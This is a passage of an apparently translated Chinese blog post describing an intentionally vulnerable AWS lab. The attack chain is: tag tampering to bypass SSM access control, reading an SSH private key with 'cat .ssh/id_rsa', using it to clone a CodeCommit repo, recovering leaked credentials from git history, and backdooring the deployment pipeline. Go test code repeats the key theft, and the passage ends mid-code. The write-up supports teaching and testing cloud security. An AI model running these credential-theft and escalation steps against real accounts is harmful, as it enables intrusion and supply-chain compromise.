&lt;/div&gt;&lt;p&gt;有一个EC2实例正在运行，标记为&lt;code&gt;Environment=dev&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;我们的IAM策略不允许我们通过AWS SSM Session Manager访问该实例。但是，我们确实有权限覆盖用于访问控制的&lt;code&gt;Environment&lt;/code&gt;标签：&lt;/p&gt;
&lt;p&gt;然后我们可以访问EC2实例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws ssm start-session --region us-east-1 --target i-030c2cba2ef533829
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting session with SessionId: ec2-sandbox-manager-06e2440aa9ed6f315
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# id&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ssm-user&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ssm-user&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ssm-user&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在用户的主目录下，我们找到一个SSH私钥：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ cat .ssh/id_rsa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-----BEGIN RSA PRIVATE KEY-----
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MIIEpAIBAAKCAQEApn/Tcy
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;通过将其指纹与账户中其他IAM用户关联的SSH公钥进行比较，我们注意到被盗的私钥属于名为&lt;code&gt;cloner&lt;/code&gt;的IAM用户：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ssh-keygen -f .ssh/stolen_key -l -E md5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; MD5:be:5e:49:5e:e5:d0:66:bb:91:30:3f:66:2e:97:1a:11
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws iam list-ssh-public-keys --user-name cloner
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;SSHPublicKeys&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;UserName&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;cloner&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;SSHPublicKeyId&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;APKA254BBSGPK2B5K5YQ&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;Status&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Active&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;UploadDate&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2021-12-27T10:34:19+00:00&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws iam get-ssh-public-key --user-name cloner --ssh-public-key-id APKA254BBSGPK2B5K5YQ --encoding PEM --output text --query &lt;span class=&#34;s1&#34;&gt;&amp;#39;SSHPublicKey.Fingerprint&amp;#39;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;be:5e:49:5e:e5:d0:66:bb:91:30:3f:66
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该用户恰好拥有对CodeCommit仓库的&lt;code&gt;codecommit:GitPull&lt;/code&gt;权限。使用CodeCommit文档，我们可以将仓库克隆到本地机器：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;700&lt;/span&gt; .ssh/stolen_key
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;AWS_REGION&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;us-east-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;sshKeyId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;aws iam list-ssh-public-keys --user-name cloner --output text --query &lt;span class=&#34;s1&#34;&gt;&amp;#39;SSHPublicKeys[0].SSHPublicKeyId&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &amp;gt;&amp;gt; .ssh/config &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Host *.amazonaws.com
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;	IdentityFile ~/.ssh/stolen_key
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone ssh://&lt;span class=&#34;nv&#34;&gt;$sshKeyId&lt;/span&gt;@git-codecommit.&lt;span class=&#34;nv&#34;&gt;$AWS_REGION&lt;/span&gt;.amazonaws.com/v1/repos/backend-api
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;现在我们有了应用程序的源代码！&lt;/p&gt;
&lt;p&gt;源代码中没有什么有趣的内容。然而，如果我们查看Git提交历史，有一个提交引起了我们的注意：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;39ac1aa (HEAD -&amp;gt; master, origin/master, origin/HEAD) Added app.py
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;88055fb Added requirements.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bdf59bb Added Dockerfile
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;f1cb341 Use built-in AWS authentication instead of hardcoded keys
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;70f0181 Added buildspec.yml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;分析这个提交的差异（&lt;code&gt;git show f1cb341&lt;/code&gt;）揭示了一些泄露的AWS凭证！&lt;/p&gt;
&lt;p&gt;使用这些凭证验证AWS时，我们注意到我们刚刚攻陷了IAM用户&lt;code&gt;developer&lt;/code&gt;的凭证，该用户拥有&lt;code&gt;codecommit:GitPush&lt;/code&gt;和&lt;code&gt;codecommit:PutFile&lt;/code&gt;权限。&lt;/p&gt;
&lt;p&gt;我们现在可以使用CodeCommit UI来后门应用程序，并等待持续部署管道将其部署到生产环境！例如，我们可以让应用程序将秘密数据记录到其日志（CloudWatch日志组&lt;code&gt;/aws/lambda/backend-api&lt;/code&gt;）中。我们也可以后门应用程序，让它在每个请求上将秘密数据发送到远程、攻击者控制的服务器——或者不修改应用程序代码，而是后门Docker镜像本身。&lt;/p&gt;
&lt;p&gt;一旦我们执行了恶意提交，CodePipeline管道就会获取我们的更改并开始将其推出到生产环境：&lt;/p&gt;
&lt;p&gt;几分钟后，我们成功地后门了应用程序并捕获了标志！&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;START RequestId: 3bd6cd1e-9e01-4012-859d-70c9fcd9d643 Version: $LATEST
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;superSecretData=FLAG{SupplyCh4!nS3curityM4tt3r5&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;END RequestId: 3bd6cd1e-9e01-4012-859d-70c9fcd9d643
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;使用端到端测试进行持续测试&#34;&gt;使用端到端测试进行持续测试
&lt;/h2&gt;&lt;p&gt;如前所述，该场景基于Terraform代码，负责创建VPC、EC2实例、管道等。Terraform代码并不简单。我们如何高度自信地认为它持续按预期工作？回想一下，在我们的上下文中，&amp;ldquo;工作&amp;quot;意味着处于可以通过预期步骤利用的状态。&lt;/p&gt;
&lt;p&gt;我们利用了Terratest，这是一个用于测试Terraform代码的Go库。更具体地说，我们编写了如下工作的Go测试：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用Terratest运行我们的Terraform代码，针对实时AWS环境。资源实际部署到AWS。&lt;/li&gt;
&lt;li&gt;从我们的Go测试中，向FooCorp API发送实际的HTTP请求，以确保它已正确部署。&lt;/li&gt;
&lt;li&gt;仍然从我们的Go测试中，以编程方式执行漏洞利用步骤，一步一步来。&lt;/li&gt;
&lt;li&gt;测试完成后，销毁我们通过Terraform代码配置的基础设施。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;然后我们可以使用&lt;code&gt;go test&lt;/code&gt;运行我们的测试，可以手动运行，也可以在每次拉取请求时自动运行。以下是&amp;quot;以代码形式存在的漏洞利用步骤&amp;quot;的样子：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;EndToEndTest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;StealPrivateSSHKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;instanceId&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 在实例上执行SSM命令以窃取SSH私钥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;ssmClient&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;NewFromConfig&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;awsConfig&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssmClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;SendCommand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;TODO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ssm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SendCommandInput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;DocumentName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;aws&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;AWS-RunShellScript&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;InstanceIds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;instanceId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;Parameters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s&#34;&gt;&amp;#34;commands&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;cat /home/ssm-user/.ssh/id_rsa&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;assert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Unable to send SSM command to instance&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
